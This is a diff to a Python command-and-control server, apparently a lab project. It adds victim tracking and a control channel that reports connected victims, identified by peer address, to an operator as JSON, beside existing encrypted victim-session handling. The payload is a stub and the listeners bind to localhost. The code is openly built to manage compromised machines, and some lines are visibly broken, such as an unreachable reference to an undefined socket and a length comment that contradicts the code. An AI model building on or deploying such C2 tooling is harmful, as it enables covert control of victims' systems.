@@ -7,11 +7,12 @@ from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_v1_5
 from Crypto.Cipher import AES
 import base64
-
+import json
 
 print = functools.partial(print, flush=True)
 
 # thread_lock = threading.Lock()
+threadList = []
 
 class Victim(Thread):
     def __init__(self,clSock):
@@ -73,7 +74,8 @@ class Victim(Thread):
         plaintext = sessionCipher.decrypt(MSG[16:])
         self.SessionIV = MSG[:16]
         return plaintext;
-
+    def get_name(self):
+        return str(self.conn.getpeername()) 
         
     def run(self):
         print("Payload Placeholder Stub")
@@ -82,7 +84,7 @@ class C2(Thread):
     
     def __init__(self,Payload):
         Thread.__init__(self)
-        print("Initilizing C2 server")
+        print("C2 Server > Initilizing C2 server")
         self.svr = socket.socket()
         self.svr.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.svr.bind(('127.0.0.1',PORT_SVR))
@@ -90,23 +92,76 @@ class C2(Thread):
         self.svr.listen(24)
         print("C2 Server > Listening for Victim Connections")
         self.vPayload = Payload
+        threadList = []
+ 
     def run(self):
         while True:
             cl, addr = self.svr.accept()
             print("C2 Server > Accepted connection from victim: ", addr)
             v=self.vPayload(cl)
-            v.setName("VictimThread")
+            v.setName("Victim: " + str(addr))
             v.start()
+            threadList.append(v)
             
         #cl.recv(1024)
                 
         svr.close()
+class CTRLClient(Thread):
 
+    def __init__(self, cliSoc):
+        Thread.__init__(self)
+        self.conn = cliSoc
+
+    def sendStr(self, SendStr):
+        length = len(SendStr)
+        self.conn.send((length).to_bytes(8,byteorder="big")) # UINT32 4 bytes.
+        self.conn.recv(1) #Sync
+        self.conn.send(SendStr.encode()) 
+        self.conn.recv(1) #Sync
+        
+    def recvStr(self):
+        msgSZ = int.from_bytes(self.conn.recv(8),byteorder='big',signed=False)
+        self.conn.send(b"\x01")
+        MSG = self.conn.recv(msgSZ)
+        self.conn.send(b"\x01") 
+        return MSG.decode()
+
+    def run(self):
+        jsonArray = []
+        for t in threadList:
+            jsonArray.append(t.get_name())
+        jsonObj = {}
+        jsonObj["VictimsArray"] = jsonArray
+        self.sendStr(json.dumps(jsonObj))
+       
+class CTRLThread(Thread):
+
+    def __init__(self):
+        Thread.__init__(self)        
+        print("C2 Server > Initilizing C2 Controle Server")
+        self.svr = socket.socket()
+        self.svr.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.svr.bind(('127.0.0.1', CTRL_PORT))
+        print("C2 Server > CTRLSver socket Binded to port:", CTRL_PORT)
+        self.svr.listen(1)
+        print("C2 Server > CTRLSver Socket Listening" )
+        
+
+    def run(self):
+        while True:
+            print ("Here")
+            cl, addr = self.svr.accept()
+            c = CTRLClient(cl) 
+            c.setName("CTRLClient")
+            c.start()
+            
 def run(payload):
-   VictimHandeler = C2(payload)
-   VictimHandeler.setName("VictimHandelerThread")
-   VictimHandeler.start()
-   print("C2 Server > Victim Handeler Thread has been initiliZed")
+    VictimHandler = C2(payload)
+    VictimHandler.setName("VictimHandelerThread")
+    VictimHandler.start()
+    CTRLHandler = CTRLThread()
+    CTRLHandler.setName("AttackControleThread")
+    CTRLHandler.start() 
 
 if __name__ == "__main__":
     run(Victim)
